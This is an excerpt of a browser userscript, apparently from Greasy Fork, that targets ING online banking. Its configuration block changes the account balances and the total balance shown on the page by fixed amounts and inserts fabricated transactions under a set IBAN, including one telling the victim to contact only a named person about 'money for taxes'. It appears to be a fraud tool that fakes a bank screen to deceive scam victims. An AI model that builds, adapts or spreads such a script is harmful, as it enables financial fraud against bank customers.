// ==UserScript==
// @name        Ed Combined ING Werner Schreiner
...
// @match        *://*/*
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/485583/Ed%20Combined%20ING%20Werner%20Schreiner.user.js
// @updateURL https://update.greasyfork.org/scripts/485583/Ed%20Combined%20ING%20Werner%20Schreiner.meta.js
// ==/UserScript==
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
    ...
    const topGesamtSaldoAdjustmentAmount = 8510;  // Change this to your desired amount

    // Define an array for account balance adjustments
    const accountBalanceAdjustments = [
        { index: 0, amount: 8510},  // Example: change the first account's balance by -1000 EUR
    //    { index: 2, amount: 100 },
        // Add more objects as needed for each account balance adjustment
    ];

    // Specify your IBAN and custom transactions here
    const yourIBAN = 'DE47 5001 0517 5446 3127 66'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 8510; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        ...
        },
      {
            ...
            transactionDetails: 'Geld für Steuern. Wenden Sie sich nur an Andreas Graf.',
